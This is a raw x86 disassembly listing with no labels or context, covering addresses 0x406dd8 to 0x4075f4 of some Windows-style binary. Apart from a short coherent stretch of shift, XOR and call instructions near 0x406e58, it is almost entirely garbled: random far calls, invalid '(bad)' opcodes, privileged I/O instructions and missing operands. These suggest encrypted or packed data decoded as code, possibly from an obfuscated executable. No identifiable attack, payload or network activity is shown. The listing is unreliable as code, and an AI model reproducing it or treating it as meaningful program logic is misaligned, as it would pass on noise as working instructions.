  406dd8:	sbb    DWORD PTR [ebx*4+0x4b31cf8a],eax
  406ddf:	outs   dx,DWORD PTR ds:[esi]
  406de0:	hlt    
  406de1:	into   
  406de2:	lea    ecx,[esi]
  406de4:	fidivr DWORD PTR [edi+0x56646968]
  406dea:	adc    edi,DWORD PTR [ecx]
  406dec:	addr16 jnp 0x406e69
  406def:	push   esp
  406df0:	jp     0x406de9
  406df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406df4:	loopne 0x406e2c
  406df6:	sbb    BYTE PTR [edx-0x21],cl
  406df9:	or     eax,0x7c7c33ef
  406dfe:	aam    0x6a
  406e00:	push   edi
  406e01:	addr16 inc ebp
  406e03:	mov    ecx,0xd3989fc1
  406e08:	mov    dh,0xe
  406e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e0b:	(bad)  
  406e0d:	xchg   ecx,eax
  406e0e:	outs   dx,BYTE PTR ds:[esi]
  406e0f:	xchg   ecx,eax
  406e10:	push   edx
  406e11:	push   esi
  406e12:	cmp    esp,edx
  406e14:	dec    ebx
  406e15:	dec    ebx
  406e16:	adc    al,al
  406e18:	mov    eax,DWORD PTR [eax]
  406e1a:	fwait
  406e1b:	(bad)  
  406e1d:	xor    BYTE PTR [esi-0x276fd9d4],dh
  406e23:	scas   eax,DWORD PTR es:[edi]
  406e24:	std    
  406e25:	sahf   
  406e26:	sbb    edx,edi
  406e28:	mov    ecx,0x1c76a756
  406e2d:	hlt    
  406e2e:	cmc    
  406e2f:	mov    ?,esi
  406e31:	rcl    BYTE PTR [ebx-0x7ef1b60c],cl
  406e37:	cwde   
  406e38:	fwait
  406e39:	imul   edi,DWORD PTR [ecx],0xab21dad0
  406e3f:	aam    0x21
  406e41:	mov    ss,esp
  406e43:	call   0x40c1:0x674ad74
  406e4a:	addr16 pop edx
  406e4c:	xor    ecx,DWORD PTR [ecx+0x568b1055]
  406e52:	add    al,0x35
  406e54:	jbe    0x406e0b
  406e56:	jns    0x406e23
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
  406ef1:	shl    eax,0x2
  406ef4:	or     eax,DWORD PTR [ebp+0x10]
  406ef7:	jmp    0x407298
  406efc:	test   al,0xc
  406efe:	lea    ebp,[esi]
  406f00:	mov    cl,0xbc
  406f02:	test   al,0x9c
  406f04:	sahf   
  406f05:	cld    
  406f06:	lds    esp,FWORD PTR [edx+esi*2-0x416db98e]
  406f0d:	dec    ecx
  406f0e:	mov    esi,0xbec4bdbe
  406f13:	mov    esi,0xdae8a648
  406f18:	movmskps edi,xmm7
  406f1b:	xor    DWORD PTR [edx],eax
  406f1d:	ss jns 0x406f4b
  406f20:	adc    DWORD PTR [ebx-0x23cf8fb0],edx
  406f26:	sbb    bl,ah
  406f28:	dec    eax
  406f29:	pop    ebp
  406f2a:	inc    edi
  406f2b:	jmp    0xbfddacff
  406f30:	jb     0x406fa0
  406f32:	xchg   esi,ebx
  406f34:	pop    ss
  406f35:	sub    al,0xda
  406f37:	push   ebx
  406f38:	jl     0x406f6b
  406f3a:	jb     0x406f14
  406f3c:	mov    DWORD PTR [ebx-0x54],edi
  406f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f40:	ret    0xc67b
  406f43:	scas   al,BYTE PTR es:[edi]
  406f44:	rol    al,1
  406f46:	fs daa 
  406f48:	inc    ebp
  406f49:	nop
  406f4a:	ror    ch,cl
  406f4c:	bound  ebp,QWORD PTR [eax-0x46b4137e]
  406f52:	mov    ch,ah
  406f54:	mov    bl,0x3f
  406f56:	iret   
  406f57:	iret   
  406f58:	sub    DWORD PTR ds:[edx-0x3a825473],ecx
  406f5f:	es inc eax
  406f61:	or     cl,BYTE PTR fs:[esi+0x22]
  406f65:	enter  0x2a3a,0x32
  406f69:	xor    eax,0xc5ec937e
  406f6e:	test   al,0x56
  406f70:	loop   0x406f62
  406f72:	xor    dh,cl
  406f74:	push   esp
  406f75:	xor    BYTE PTR [ebp+0x28],bh
  406f78:	jne    0x406f26
  406f7a:	push   ebp
  406f7b:	and    al,0x36
  406f7d:	icebp  
  406f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f7f:	add    bl,cl
  406f81:	mov    al,ds:0x10ea02fd
  406f86:	gs sub al,0x31
  406f89:	les    eax,FWORD PTR [esi-0x39d9d533]
  406f8f:	out    0xc6,eax
  406f91:	xchg   edi,eax
  406f92:	mov    ah,0x8b
  406f94:	pop    ds
  406f95:	repnz loopne 0x407001
  406f98:	int3   
  406f99:	iret   
  406f9a:	mov    ah,0x25
  406f9c:	jge    0x406fff
  406f9e:	dec    esp
  406f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa0:	adc    eax,0x83407079
  406fa5:	call   0x644645df
  406faa:	xchg   DWORD PTR [edi-0x9],ecx
  406fad:	cs adc bh,ch
  406fb0:	or     eax,0xd0a2ac46
  406fb5:	ja     0x406fd8
  406fb7:	sbb    bh,BYTE PTR [edx+0x7788600]
  406fbd:	xlat   BYTE PTR ds:[ebx]
  406fbe:	add    al,0x57
  406fc0:	push   cs
  406fc1:	push   esp
  406fc2:	test   eax,0x62c2adde
  406fc7:	imul   edi,DWORD PTR [eax],0x93becfc8
  406fcd:	inc    ebp
  406fce:	lahf   
  406fcf:	lock jg 0x406fef
  406fd2:	in     eax,dx
  406fd3:	dec    ebx
  406fd4:	xchg   edx,eax
  406fd5:	or     al,0x3d
  406fd7:	je     0x406fb2
  406fd9:	mov    cs,esp
  406fdb:	sbb    DWORD PTR [edx-0x16],ecx
  406fde:	inc    edi
  406fdf:	dec    DWORD PTR [ebp+0x3e]
  406fe2:	(bad)  
  406fe3:	mov    al,ds:0x5b0aa5b4
  406fe8:	pusha  
  406fe9:	repnz aad 0x20
  406fec:	sahf   
  406fed:	std    
  406fee:	sub    DWORD PTR [eax-0x3f],esi
  406ff1:	jne    0x406fe4
  406ff3:	xor    eax,0x9d11f8ff
  406ff8:	in     eax,dx
  406ff9:	int    0x59
  406ffb:	mov    edx,0x80bcb34
  407000:	jbe    0x406fa2
  407002:	lock unpckhps xmm6,XMMWORD PTR fs:[edx+0x355a5176]
  40700b:	add    BYTE PTR [eax+ebx*4-0x5bc12637],0xfb
  407013:	jno    0x407088
  407015:	xchg   edi,eax
  407016:	hlt    
  407017:	ror    DWORD PTR [eax-0x42],cl
  40701a:	fs jecxz 0x406fdd
  40701d:	(bad)  
  40701f:	adc    ebx,esp
  407021:	cs cmp eax,0x3bafcd19
  407027:	shl    DWORD PTR ds:0x5a663f21,cl
  40702d:	loop   0x40705f
  40702f:	(bad)  
  407030:	adc    BYTE PTR [ecx+0x712e89b4],dh
  407036:	xor    eax,0xaa84a12a
  40703b:	mov    cl,0x3a
  40703d:	jl     0x406ffd
  40703f:	into   
  407040:	fisttp QWORD PTR [ebx+0x4a]
  407043:	les    ebx,FWORD PTR [edi-0x369e6aae]
  407049:	call   0x1c26:0x9f46ed5e
  407050:	ret    
  407051:	sti    
  407052:	cmp    ah,bl
  407054:	sub    eax,0x26880835
  407059:	dec    ecx
  40705a:	std    
  40705b:	cmc    
  40705c:	repz inc ebx
  40705e:	mov    ds:0x103f859a,eax
  407063:	dec    edx
  407064:	lds    edx,FWORD PTR [edx-0x16]
  407067:	pop    ss
  407068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407069:	shl    DWORD PTR [edi],1
  40706b:	fs lock pop esp
  40706e:	pop    edx
  40706f:	popf   
  407070:	dec    esp
  407071:	sbb    al,BYTE PTR [eax]
  407073:	(bad)  
  407074:	out    dx,eax
  407075:	cmp    DWORD PTR [ecx+ebp*4-0x4a],ecx
  407079:	ret    
  40707a:	push   esp
  40707b:	jg     0x407096
  40707d:	sub    dl,0x6d
  407080:	sbb    al,0xe2
  407082:	and    BYTE PTR [ebx+edx*4-0x45],0xc7
  407087:	das    
  407088:	mov    ch,0x5b
  40708a:	push   edi
  40708b:	les    ebp,FWORD PTR [eax]
  40708d:	inc    ecx
  40708e:	xlat   BYTE PTR ds:[ebx]
  40708f:	popa   
  407090:	jmp    0x7046:0x68bbe84
  407097:	into   
  407098:	rcr    BYTE PTR [ebx+0x48],cl
  40709b:	cli    
  40709c:	pop    edx
  40709d:	pushf  
  40709e:	push   cs
  40709f:	dec    ecx
  4070a0:	dec    edi
  4070a1:	call   0x98e5:0x924c2cd3
  4070a8:	pop    eax
  4070a9:	mov    ecx,esi
  4070ab:	cmp    DWORD PTR [esi+ecx*4],edi
  4070ae:	add    eax,ebx
  4070b0:	(bad)  
  4070b2:	das    
  4070b3:	push   es
  4070b4:	int3   
  4070b5:	nop
  4070b6:	sar    DWORD PTR [eax],0xa8
  4070b9:	or     DWORD PTR [esi],0x6f82bc0c
  4070bf:	jmp    0xd310:0xac291f08
  4070c6:	cwde   
  4070c7:	push   cs
  4070c8:	sbb    ebx,edi
  4070ca:	jmp    0x407081
  4070cc:	(bad)  [ebp+0x5ff44574]
  4070d2:	rcl    al,cl
  4070d4:	ins    BYTE PTR es:[edi],dx
  4070d5:	sub    DWORD PTR [ebx],0xae09b2c8
  4070db:	push   edx
  4070dc:	sti    
  4070dd:	dec    eax
  4070de:	inc    edx
  4070df:	data16 jp 0x40711c
  4070e2:	mov    edi,0x5801bb9f
  4070e7:	lods   eax,DWORD PTR ds:[esi]
  4070e8:	or     al,BYTE PTR [edx-0x5a]
  4070eb:	mov    esp,0x77f03035
  4070f0:	jns    0x407151
  4070f2:	(bad)  
  4070f3:	mov    gs,edx
  4070f5:	and    eax,0xdf4c18a1
  4070fa:	in     al,0x5a
  4070fc:	or     ecx,esp
  4070fe:	adc    al,BYTE PTR [ecx-0x541dfbce]
  407104:	pop    ecx
  407105:	inc    esi
  407106:	lds    ebp,FWORD PTR [esi]
  407108:	mov    dh,0x37
  40710a:	aam    0x4e
  40710c:	push   0xffffffec
  40710e:	cmc    
  40710f:	and    al,0xb3
  407111:	pop    eax
  407112:	aad    0xc6
  407114:	imul   eax,DWORD PTR fs:[ecx],0xdcaf5fa
  40711b:	data16 and cl,0xc7
  40711f:	aad    0xb8
  407121:	or     BYTE PTR [ecx+0x1b],bh
  407124:	repnz inc esp
  407126:	daa    
  407127:	sahf   
  407128:	int3   
  407129:	adc    DWORD PTR ds:0xcb2efaa7,0x75
  407130:	in     al,dx
  407131:	pop    eax
  407132:	jbe    0x407104
  407134:	mov    edi,0xf070b926
  407139:	jne    0x407187
  40713b:	xchg   esi,eax
  40713c:	push   cs
  40713d:	sub    eax,0x3821e47b
  407142:	and    eax,0xeff8d4e8
  407147:	inc    edi
  407148:	xchg   ebp,eax
  407149:	pop    es
  40714a:	sub    eax,0x7fc90225
  40714f:	call   0xf144344
  407154:	xor    ch,BYTE PTR ds:0xb25c3b1b
  40715a:	mov    ?,ebx
  40715c:	cdq    
  40715d:	imul   edx,DWORD PTR [edx-0x494287da],0x841896f0
  407167:	repnz es push ebx
  40716a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40716b:	mov    dh,0x7c
  40716d:	aaa    
  40716e:	(bad)  
  407170:	adc    BYTE PTR [edi-0x603ddd76],bl
  407176:	jmp    0x4071cc
  407178:	mov    ?,WORD PTR [edx]
  40717a:	jecxz  0x407131
  40717c:	in     eax,dx
  40717d:	xchg   ebx,eax
  40717e:	push   ecx
  40717f:	xor    BYTE PTR [edi],bh
  407181:	xchg   esp,eax
  407182:	push   ebp
  407183:	enter  0x416,0x6a
  407187:	mov    ah,0x59
  407189:	jae    0x407126
  40718b:	inc    edi
  40718c:	push   ecx
  40718d:	adc    BYTE PTR [ecx-0x40],bl
  407190:	inc    esp
  407191:	pop    eax
  407192:	out    0x89,al
  407194:	pop    eax
  407195:	leave  
  407196:	or     al,0x7f
  407198:	clc    
  407199:	pop    edx
  40719a:	adc    DWORD PTR [edx],esp
  40719c:	xchg   esi,eax
  40719d:	arpl   dx,di
  40719f:	out    0x2b,eax
  4071a1:	ret    
  4071a2:	add    BYTE PTR [edx],cl
  4071a4:	xor    eax,0xf815843c
  4071a9:	sub    cl,0xc2
  4071ac:	les    esp,FWORD PTR [ebx+edi*4]
  4071af:	mov    edx,0x650053c7
  4071b4:	pop    ss
  4071b5:	push   edx
  4071b6:	aam    0xf8
  4071b8:	xchg   esp,eax
  4071b9:	sbb    DWORD PTR [esi],ebp
  4071bb:	loopne 0x407169
  4071bd:	jb     0x407150
  4071bf:	sbb    al,0x61
  4071c1:	js     0x4071f6
  4071c3:	mov    dl,BYTE PTR [esi-0x5e]
  4071c6:	dec    edx
  4071c7:	(bad)  
  4071c8:	shr    DWORD PTR [ebp-0x16],cl
  4071cb:	not    DWORD PTR [eax]
  4071cd:	mov    ebx,0xae074e79
  4071d2:	repnz xor DWORD PTR [edi+0x1],ecx
  4071d6:	mov    ah,0x5
  4071d8:	jl     0x40720f
  4071da:	sub    ebp,0xa08cd556
  4071e0:	sbb    BYTE PTR [ecx],dl
  4071e2:	sbb    BYTE PTR [edi],dl
  4071e4:	fadd   QWORD PTR [esi+ebx*2-0xe1ec50e]
  4071eb:	les    ecx,FWORD PTR [edi+esi*8]
  4071ee:	fstp   DWORD PTR [ebx+0x100c9e97]
  4071f4:	mov    bl,0x3a
  4071f6:	jns    0x40723c
  4071f8:	int3   
  4071f9:	jo     0x407262
  4071fb:	push   ss
  4071fc:	popa   
  4071fd:	not    BYTE PTR [ebx+0x5481a3bc]
  407203:	dec    esi
  407204:	inc    eax
  407205:	lds    esp,FWORD PTR [eax+0x59]
  407208:	bound  ebp,QWORD PTR [edx-0x78]
  40720b:	es scas al,BYTE PTR es:[edi]
  40720d:	push   0xae247a12
  407212:	or     eax,0xf22edf51
  407217:	adc    eax,0xc629e0f1
  40721c:	adc    esp,ebx
  40721e:	mov    eax,0x76fad074
  407223:	jae    0x407266
  407225:	lahf   
  407226:	dec    edx
  407227:	dec    esi
  407228:	cmp    al,0xa
  40722a:	push   esp
  40722b:	call   0xd6b:0x609c6139
  407232:	push   ecx
  407233:	shr    DWORD PTR [eax+0x17],0x77
  407237:	fisubr DWORD PTR [ecx+0x31c55e33]
  40723d:	fild   QWORD PTR [edi-0x6c]
  407240:	mov    BYTE PTR [ecx],0xb5
  407243:	loopne 0x4071df
  407245:	add    BYTE PTR ds:0x4a0ebea4,ch
  40724b:	loope  0x4071df
  40724d:	lahf   
  40724e:	jl     0x4072a0
  407250:	xchg   ecx,eax
  407251:	mov    BYTE PTR [esi-0x16],cl
  407254:	sub    eax,0xebc9a694
  407259:	adc    ah,dl
  40725b:	xchg   esi,eax
  40725c:	mov    al,0xb1
  40725e:	call   DWORD PTR [ebp+0x13d5133b]
  407264:	mov    ds:0x5c94b066,eax
  407269:	jns    0x4072b7
  40726b:	lock mov eax,ds:0xc71747f7
  407271:	pop    edx
  407272:	(bad)  
  407273:	fs adc eax,ebp
  407276:	test   eax,0x8e6198b9
  40727b:	ds data16 mov cl,0xad
  40727f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407280:	sbb    eax,0xb04199bf
  407285:	sti    
  407286:	stos   BYTE PTR es:[edi],al
  407287:	dec    eax
  407288:	mov    edx,0x39861159
  40728d:	int3   
  40728e:	push   ebx
  40728f:	cli    
  407290:	push   0xf42870a3
  407295:	stos   DWORD PTR es:[edi],eax
  407296:	rcl    DWORD PTR [esi-0x2fcc06cd],0x81
  40729d:	bnd jbe 0x407255
  4072a0:	jns    0x40726d
  4072a2:	xor    edi,0x9c2b8ae8
  4072a8:	mov    DWORD PTR [esi],edx
  4072aa:	jmp    0x40764b
  4072af:	mov    bl,0xe6
  4072b1:	ds lahf 
  4072b3:	pushf  
  4072b4:	test   al,0xb4
  4072b6:	stc    
  4072b7:	jo     0x4072e0
  4072b9:	inc    edx
  4072ba:	ffree  st(0)
  4072bc:	fdiv   DWORD PTR [eax-0x23]
  4072bf:	mov    ebp,0xbdbebe4f
  4072c4:	les    edi,FWORD PTR [esi-0x7eebf142]
  4072ca:	mov    cl,BYTE PTR ds:0x1c8d1faa
  4072d0:	fcom   st(7)
  4072d2:	call   0xb58e:0x76fe0f35
  4072d9:	push   cs
  4072da:	aam    0x6d
  4072dc:	push   ebx
  4072dd:	and    al,0x17
  4072df:	xchg   ebx,eax
  4072e0:	pushf  
  4072e1:	test   BYTE PTR [ecx+0x7cfe2893],cl
  4072e7:	nop
  4072e8:	retf   0x411c
  4072eb:	enter  0xeb4b,0x64
  4072ef:	inc    edi
  4072f0:	xchg   edi,eax
  4072f1:	mov    ss,esp
  4072f3:	pop    edx
  4072f4:	stc    
  4072f5:	push   ds
  4072f6:	sbb    BYTE PTR [ebx],0x80
  4072f9:	lods   eax,DWORD PTR ds:[esi]
  4072fa:	test   ax,bx
  4072fd:	pushf  
  4072fe:	jmp    0x2ac41b81
  407303:	daa    
  407304:	pusha  
  407305:	mov    dl,0xcd
  407307:	pop    es
  407308:	jmp    0x3bac99f7
  40730d:	xor    eax,0xa06eae1a
  407312:	loopne 0x407353
  407314:	or     BYTE PTR fs:[esi-0x21fadf1b],bl
  40731b:	mov    edi,0xe1a6ad5e
  407320:	push   0xffffffad
  407322:	jne    0x407334
  407324:	call   0x281854db
  407329:	jp     0x407304
  40732b:	ror    BYTE PTR [ebx+0x6d0acfbd],0x39
  407332:	and    al,0x96
  407334:	mul    BYTE PTR ds:0x7b01fc3e
  40733a:	mov    bh,0x7f
  40733c:	loope  0x407379
  40733e:	xchg   edx,eax
  40733f:	mov    ds:0x83e52f2d,eax
  407344:	lock or bh,BYTE PTR [ecx+eiz*2+0x5e40ee0c]
  40734c:	cli    
  40734d:	or     edx,0x8da6e904
  407353:	sti    
  407354:	jl     0x407318
  407356:	xor    ebp,DWORD PTR [eax-0x6315e314]
  40735c:	push   ss
  40735d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40735e:	or     ebx,eax
  407360:	dec    eax
  407361:	and    edx,ecx
  407363:	(bad)  
  407365:	lock push ds
  407367:	call   0xfab8:0xd8259f35
  40736e:	sbb    BYTE PTR [edx],bl
  407370:	push   es
  407371:	ins    BYTE PTR es:[edi],dx
  407372:	cmp    BYTE PTR [ecx+esi*4+0x63],0xc5
  407377:	cs jg  0x4073a6
  40737a:	mov    ch,0x34
  40737c:	rcr    DWORD PTR [ebx],1
  40737e:	inc    edi
  40737f:	mov    ah,0x1d
  407381:	xchg   ebx,eax
  407382:	(bad)  
  407383:	int3   
  407384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407385:	fcom   QWORD PTR [ebp-0x642c7ce5]
  40738b:	js     0x407317
  40738d:	out    dx,eax
  40738e:	jle    0x40740b
  407390:	sbb    al,0x52
  407392:	inc    ebp
  407393:	sub    eax,0xd4bd6300
  407398:	and    BYTE PTR [edi-0x67fceca],al
  40739e:	(bad)  
  40739f:	push   eax
  4073a0:	pop    eax
  4073a1:	mov    ds:0xf30e3c6,al
  4073a6:	adc    eax,0xfaff2694
  4073ab:	(bad)  
  4073ae:	xchg   BYTE PTR [eax+0x69d6a22e],cl
  4073b4:	nop
  4073b5:	pusha  
  4073b6:	add    eax,0x2839f885
  4073bb:	std    
  4073bc:	jne    0x40736d
  4073be:	iret   
  4073bf:	cmp    BYTE PTR [ecx-0x6],dl
  4073c2:	adc    eax,0xb9ea77b6
  4073c7:	icebp  
  4073c8:	and    eax,0x7501ba2b
  4073cd:	addr16 cs js 0x407388
  4073d1:	stos   DWORD PTR es:[edi],eax
  4073d2:	jo     0x4073fa
  4073d4:	adc    BYTE PTR [edx],al
  4073d6:	(bad)  
  4073d7:	in     eax,dx
  4073d8:	mov    edx,0xb0cb093c
  4073dd:	jo     0x40740a
  4073df:	cdq    
  4073e0:	outs   dx,BYTE PTR ds:[esi]
  4073e1:	(bad)  
  4073e2:	adc    dh,ah
  4073e4:	cli    
  4073e5:	out    dx,eax
  4073e6:	out    0x86,eax
  4073e8:	in     al,0x2c
  4073ea:	lock aas 
  4073ec:	and    DWORD PTR [ebp-0xa9c1ff],0xffffffcf
  4073f3:	mov    WORD PTR [ebp-0x10b86009],ds
  4073f9:	or     ah,bh
  4073fb:	mov    al,ds:0x18a8f26f
  407400:	out    0x91,al
  407402:	or     ebp,0xeb618fde
  407408:	dec    ecx
  407409:	popf   
  40740a:	dec    eax
  40740b:	lea    esp,[ecx-0x75]
  40740e:	sbb    DWORD PTR [edi+0x17],edi
  407411:	(bad)  
  407412:	inc    BYTE PTR [edx]
  407414:	dec    esi
  407415:	rcr    BYTE PTR [edx+0x3922cd2a],0xac
  40741c:	call   0x482a929c
  407421:	push   0xffffffc0
  407423:	int    0x8c
  407425:	ins    BYTE PTR es:[edi],dx
  407426:	push   cs
  407427:	jp     0x40747a
  407429:	sti    
  40742a:	pop    esi
  40742b:	sub    BYTE PTR [eax-0x633c0cc3],bh
  407431:	mov    cl,0x31
  407433:	rcl    DWORD PTR [edx-0x67e8c86b],0x73
  40743a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743b:	ret    0x28c5
  40743e:	dec    eax
  40743f:	jecxz  0x407478
  407441:	and    BYTE PTR [edi-0x495a7ac],al
  407447:	pop    esi
  407448:	cmc    
  407449:	sub    eax,0x7f71c3a9
  40744e:	mov    esi,0x43878cc3
  407453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407454:	cmp    BYTE PTR [edx+0x37],al
  407457:	pop    ss
  407458:	ja     0x4074cb
  40745a:	cdq    
  40745b:	mov    cl,0x9c
  40745d:	mov    dh,ah
  40745f:	out    0x21,al
  407461:	mov    WORD PTR [eax+0x284669b9],?
  407467:	mov    dh,0x96
  407469:	cmp    DWORD PTR [esi-0x56],0xffffffb9
  40746d:	jno    0x407464
  40746f:	out    dx,eax
  407470:	and    DWORD PTR [ecx+0x7bf6393],ecx
  407476:	pop    es
  407477:	jmp    0xe880:0xbec0e6c7
  40747e:	xor    al,0x19
  407480:	into   
  407481:	cmove  esp,DWORD PTR [edx+ecx*2+0x34]
  407486:	scas   al,BYTE PTR es:[edi]
  407487:	pop    ebp
  407488:	enter  0xe796,0xda
  40748c:	scas   eax,DWORD PTR es:[edi]
  40748d:	pushf  
  40748e:	mov    WORD PTR [esi+0x4d0734e5],ss
  407494:	mov    BYTE PTR [ebx],ch
  407496:	jmp    0x40745c
  407498:	xor    eax,0xa775c4c7
  40749d:	adc    eax,0xffaf8bd6
  4074a2:	push   ebx
  4074a3:	test   ebx,esp
  4074a5:	shl    ah,cl
  4074a7:	inc    ebx
  4074a8:	jge    0x40747f
  4074aa:	rcr    bl,0xe5
  4074ad:	cmc    
  4074ae:	push   ebx
  4074af:	popa   
  4074b0:	std    
  4074b1:	fld    st(3)
  4074b3:	sbb    edi,DWORD PTR [ecx]
  4074b5:	test   eax,0x8c1bfcdd
  4074ba:	dec    ebx
  4074bb:	pushf  
  4074bc:	fild   WORD PTR [esi-0x5b12f452]
  4074c2:	and    al,0x59
  4074c4:	jbe    0x4074d9
  4074c6:	push   edx
  4074c7:	jnp    0x40748a
  4074c9:	pop    ebp
  4074ca:	(bad)  
  4074cb:	add    eax,0x493e5005
  4074d0:	les    ebp,FWORD PTR [ecx-0x49aae169]
  4074d6:	xor    DWORD PTR [ebp-0xfd7aca8],ebx
  4074dc:	sbb    bh,bl
  4074de:	xchg   ebx,eax
  4074df:	dec    edx
  4074e0:	pop    es
  4074e1:	xchg   ebp,eax
  4074e2:	and    ch,BYTE PTR [ebx-0x66]
  4074e5:	mov    ecx,0xc7c4ebc2
  4074ea:	xor    esi,0x68
  4074ed:	inc    esp
  4074ee:	push   esp
  4074ef:	out    dx,al
  4074f0:	cmp    eax,0x49a93b7c
  4074f5:	jbe    0x407527
  4074f7:	sub    eax,0x96faa15b
  4074fc:	pop    eax
  4074fd:	jbe    0x407506
  4074ff:	pushf  
  407500:	and    DWORD PTR [edx],0x2bfca58b
  407506:	fwait
  407507:	mov    ds:0xda28f860,al
  40750c:	mov    al,0xef
  40750e:	add    edi,esp
  407510:	loopne 0x407526
  407512:	or     al,0xb9
  407514:	dec    esp
  407515:	ins    DWORD PTR es:[edi],dx
  407516:	scas   al,BYTE PTR es:[edi]
  407517:	or     al,0x23
  407519:	dec    edx
  40751a:	mov    ebx,0x4e6aeceb
  40751f:	mov    dh,0x83
  407521:	loop   0x40756c
  407523:	stos   BYTE PTR es:[edi],al
  407524:	lds    eax,FWORD PTR [ebx]
  407526:	sti    
  407527:	xor    eax,0xc272682c
  40752c:	jo     0x4074b8
  40752e:	mov    ebp,0x727f2e95
  407533:	mov    esp,ebx
  407535:	mov    ah,0xff
  407537:	or     edi,ecx
  407539:	gs xor al,0xea
  40753c:	pop    es
  40753d:	pop    esp
  40753e:	adc    ah,dh
  407540:	data16 mov cl,ah
  407543:	xchg   ebp,eax
  407544:	pop    eax
  407545:	xor    DWORD PTR [esi+0x57af2d59],ebp
  40754b:	cmp    esi,edx
  40754d:	cmc    
  40754e:	add    al,BYTE PTR [edi]
  407550:	dec    ebx
  407551:	lods   al,BYTE PTR ds:[esi]
  407552:	mov    ebp,DWORD PTR [edi+0x42]
  407555:	and    edx,DWORD PTR [ecx+eax*2]
  407558:	shl    DWORD PTR ds:0xbcbeebd,1
  40755e:	cmp    DWORD PTR [ebp+0x74],edi
  407561:	cmp    eax,0x2185e268
  407566:	ror    bl,1
  407568:	mov    cl,BYTE PTR [esi-0xc]
  40756b:	stos   DWORD PTR es:[edi],eax
  40756c:	bswap  edx
  40756e:	idiv   esp
  407570:	ss jmp 0x28e04d47
  407576:	mov    al,BYTE PTR [ebp+0x1954f5ed]
  40757c:	push   esi
  40757d:	sbb    ch,BYTE PTR [edx]
  40757f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407580:	in     eax,dx
  407581:	sub    bl,BYTE PTR [edi+0x67]
  407584:	cmp    ch,BYTE PTR [esi+0x2c106d7f]
  40758a:	(bad)  
  40758b:	sub    esi,DWORD PTR [ecx+0x7]
  40758e:	jno    0x407512
  407590:	push   ds
  407591:	aad    0xc2
  407593:	inc    ebp
  407594:	jmp    0xc22a:0xc2c64347
  40759b:	das    
  40759c:	lea    edi,[eax+0x3e]
  40759f:	int    0xbb
  4075a1:	pop    ss
  4075a2:	mov    al,ds:0x4a2c1aff
  4075a7:	mov    ecx,0xbbd6b2ab
  4075ac:	add    al,0xe1
  4075ae:	xchg   esi,eax
  4075af:	daa    
  4075b0:	loop   0x407602
  4075b2:	loope  0x407598
  4075b4:	mov    ah,0x1a
  4075b6:	sahf   
  4075b7:	and    esi,DWORD PTR [edx]
  4075b9:	add    cl,BYTE PTR [eax]
  4075bb:	sub    eax,0x8a9f2ce6
  4075c0:	js     0x4075a3
  4075c2:	lahf   
  4075c3:	mov    BYTE PTR [ecx+0x67567ce9],bh
  4075c9:	cs jbe 0x4075eb
  4075cc:	call   0xb6f0:0x6bc09a6
  4075d3:	mov    BYTE PTR [eax+0x50],bh
  4075d6:	cmp    ch,BYTE PTR [ecx]
  4075d8:	add    ch,BYTE PTR [ecx]
  4075da:	add    eax,DWORD PTR [esi]
  4075dc:	retf   0x7909
  4075df:	fdiv   DWORD PTR [ecx+0x65]
  4075e2:	push   ecx
  4075e3:	rcr    BYTE PTR [ebx-0x25],cl
  4075e6:	or     dl,ch
  4075e8:	stc    
  4075e9:	push   0xfddd6af4
  4075ee:	mov    bh,0xb
  4075f0:	adc    al,0xe4
  4075f2:	pop    ecx
  4075f3:	(bad)  
  4075f4:	adc    edx,DWORD PTR [ebp*2-0x41b9d218]
